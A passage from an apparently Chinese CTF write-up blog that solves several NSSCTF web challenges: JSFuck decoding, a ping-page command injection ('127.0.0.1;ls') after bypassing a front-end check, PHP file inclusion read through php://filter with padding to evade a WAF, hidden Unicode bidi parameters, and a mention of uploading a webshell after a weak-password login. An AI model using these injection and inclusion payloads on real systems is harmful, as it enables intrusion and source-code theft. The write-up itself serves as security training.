operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>注意到它的特征：仅用（）[] + !</p>\n<p>搜一下知道是 JSFUCK 加密。</p>\n<p>把这串代码复制到控制台执行即可得出结果。</p>\n<h3 id=\"litctf-2023ping\"><a class=\"anchor\" href=\"#litctf-2023ping\">#</a> [LitCTF 2023]Ping</h3>\n<h4 id=\"前端绕过信息收集rcejs分析\"><a class=\"anchor\" href=\"#前端绕过信息收集rcejs分析\">#</a> 前端绕过，信息收集，RCE，js 分析</h4>\n<p>进去后是个 ping 的窗口，让我们试着 ping 一下，ping 呗</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>127.0.0.1<span class=\"token punctuation\">;</span>ls</pre></td></tr></table></figure><p>弹出一口窗口：</p>\n<blockquote>\n<p>敢于尝试已经是很厉害了，如果是这样的话，就只能输入 ip 哦</p>\n</blockquote>\n<p>那就直接看看源码里有啥呗：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script type<span class=\"token operator\">=</span><span class=\"token string\">\"text/javascript\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function\">check_ip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">let</span> ip <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'command'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> re <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">.</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr></table></figure><p>交给无敌的 gpt 看看啥意思：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script type<span class=\"token operator\">=</span><span class=\"token string\">\"text/javascript\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token comment\">// 定义一个函数，用于检查输入的 IP 地址是否合法</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function\">check_ip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 获取输入框中的 IP 地址</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">let</span> ip <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">'command'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// 定义一个正则表达式，用于匹配合法的 IP 地址格式</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">let</span> re <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d&#123;2&#125;|[1-9]?\\d)$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 使用正则表达式测试输入的 IP 地址是否匹配合法格式</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">.</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token comment\">// 如果匹配成功，返回 true 表示 IP 地址合法</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 如果 IP 地址格式不合法，弹出警告框提示用户</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">// 返回 false 表示 IP 地址不合法</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr></table></figure><p>说白了就是看看我们 ip 合不合法，可终究只是前端限制，发一个合法的数据包，用 hackbar 或者 bp 改下数据重发就行了。剩下直接命令执行即可。</p>\n<h3 id=\"gdouctf-2023hate-eat-snake\"><a class=\"anchor\" href=\"#gdouctf-2023hate-eat-snake\">#</a> [GDOUCTF 2023]hate eat snake</h3>\n<h4 id=\"js分析\"><a class=\"anchor\" href=\"#js分析\">#</a> JS 分析。</h4>\n<p>打开题目后有一串提示：</p>\n<blockquote>\n<p>&quot; 提示：空格键控制开始 / 暂停，方向键控制蛇的移动方向，F5 刷新<br />\n撞墙，吃到自己，吃到果子都会 g 噢。如果你能坚持 60 秒，你就是真男人</p>\n</blockquote>\n<p>玩了下根本不可能坚持到 60 秒。</p>\n<p>打开源码发现 snake.js。进入后搜索 flag，没搜到，</p>\n<p>简单审计一下，发现这题目有两种思路，一种是修改一直在自增的速度，这样可以玩到 60 秒，另一种就是修改时间，让时间大于 60 秒。</p>\n<p>用 F12 将源码保存下来，将把 JS 中的 score 变量修改为大于 60<br />\nvar score = 100;<br />\n 或者删去 speed++。</p>\n<p>当然也能在控制台上进行操作</p>\n<p>直接新建一个然后控制就行，正好  <code>Snake</code>  自带  <code>reset</code>  方法，新建即重置。然后控制速度。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>let snk <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Snake</span><span class=\"token punctuation\">(</span>'eatSnake'<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">setInterval</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span> snk<span class=\"token punctuation\">.</span>speed <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这题目解决方式挺多的，还有一种方式就是挂掉后点取消，等个 60 秒就行了。</p>\n<h2 id=\"2023915\"><a class=\"anchor\" href=\"#2023915\">#</a> 2023/9/15</h2>\n<h3 id=\"鹏城杯-2022简单包含\"><a class=\"anchor\" href=\"#鹏城杯-2022简单包含\">#</a> [鹏城杯 2022] 简单包含</h3>\n<h4 id=\"php伪协议waf绕过文件包含\"><a class=\"anchor\" href=\"#php伪协议waf绕过文件包含\">#</a> php 伪协议，waf 绕过，文件包含，</h4>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//flag in /var/www/html/flag.php;</span></span></pre></td></tr></table></figure><p>用 php 伪协 = 协议直接尝试一下：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag=<span class=\"token property\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-encode/resource=flag.php</span></pre></td></tr></table></figure><p>回显</p>\n<blockquote>\n<p>nssctf waf!</p>\n</blockquote>\n<p>那就看看 index.php 里面有什么：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag=<span class=\"token property\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-encode/resource=index.php</span></pre></td></tr></table></figure><p>base64 解码得：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">800</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'nssctf waf!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    @<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>大致意思就是输入必须超过 800 字符才能输出带有 flag 的文件。</p>\n<p>那就添加脏数据进行绕过：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a=141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414&amp;flag=<span class=\"token property\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr></table></figure><h3 id=\"nisactf-2022checkin\"><a class=\"anchor\" href=\"#nisactf-2022checkin\">#</a> [NISACTF 2022]checkin</h3>\n<h4 id=\"源码泄露代码审计unicode不可见字符\"><a class=\"anchor\" href=\"#源码泄露代码审计unicode不可见字符\">#</a> 源码泄露，代码审计，unicode 不可见字符</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// ‮⁦NISACTF⁩⁦Welcome to</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"jitanglailo\"</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>ahahahaha<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span>‮⁦<span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span>⁩⁦<span class=\"token operator\">&amp;</span> <span class=\"token string double-quoted-string\">\"‮⁦ Flag!⁩⁦N1SACTF\"</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>‮⁦Ugeiwo⁩⁦cuishiyuan<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//tnnd! weishenme b</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$FLAG</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>进入题目后源码，看起来很简单，只需要传两个参数就可以了。</p>\n<p>但是没有成功，本来想将他放在 php 里面看看有什么问题，结果发现莫名多了很多字符。</p>\n<p><img data-src=\"../../../images/NSS/8.png\" alt=\"8\" /></p>\n<p>这三个不可见字符是三个 unicode 编码，具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va29uZ2xvbmd3dS9wLzE2MDc0Mjk5Lmh0bWw=\">U+202E、U+2066、U+2069</span></p>\n<p>既然这样，我们要是想让它在浏览器中显示，就给它 url 编码一次即可。</p>\n<p>只需这样就可以把第二个参数真正传参：</p>\n<p><img data-src=\"../../../images/NSS/9.png\" alt=\"9\" /></p>\n<p>最终 payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?ahahahaha=jitanglailo&amp;<span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%80</span><span class=\"token placeholder selector\">%AE</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%81</span><span class=\"token placeholder selector\">%A6Ugeiwo</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%81</span><span class=\"token placeholder selector\">%A9</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%81</span><span class=\"token placeholder selector\">%A6cuishiyuan</span>=<span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%80</span><span class=\"token placeholder selector\">%AE</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%81</span><span class=\"token placeholder selector\">%A6</span>+Flag<span class=\"token placeholder selector\">%21</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%81</span><span class=\"token placeholder selector\">%A9</span><span class=\"token placeholder selector\">%E2</span><span class=\"token placeholder selector\">%81</span><span class=\"token placeholder selector\">%A6N1SACTF</span></pre></td></tr></table></figure><h3 id=\"litctf-2023作业管理系统\"><a class=\"anchor\" href=\"#litctf-2023作业管理系统\">#</a> [LitCTF 2023] 作业管理系统</h3>\n<h4 id=\"弱口令文件上传\"><a class=\"anchor\" href=\"#弱口令文件上传\">#</a> 弱口令，文件上传</h4>\n<p>很简单的一道题，打开源代码提示账户密码是 admin，登录后上传一句话木马文件即可。</p>\n<h3 id=\"swpuctf-2022-新生赛ez_ez_php\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛ez_ez_php\">#</a> [SWPUCTF 2022 新生赛] ez_ez_php</h3>\n<h4 id=\"php伪协议文件包含-2\"><a class=\"anchor\" href=\"#php伪协议文件包含-2\">#</a> php 伪协议，文件包含</h4>\n<p>题目:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"php\"</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Nice!!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hacker!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//flag.php</span></span></pre></td></tr></table></figure><p>伪协议直接读取后解码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span>   <span class=\"token string double-quoted-string\">\"NSSCTF&#123;flag_is_not_here&#125;\"</span> 